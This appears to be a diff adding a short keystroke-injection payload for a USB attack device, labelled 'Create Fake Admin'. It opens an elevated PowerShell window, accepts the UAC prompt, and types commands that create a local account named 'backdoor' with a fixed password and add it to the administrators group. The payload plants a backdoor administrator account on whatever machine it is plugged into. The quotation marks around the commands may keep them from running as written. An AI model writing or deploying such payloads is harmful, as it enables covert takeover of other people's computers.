@@ -1,0 +1,15 @@
+REM Create Fake Admin
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CONTROL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING "net user /add backdoor p@ssword123"
+ENTER
+DELAY 500
+STRING "net localgroup administrators backdoor /add"
+ENTER
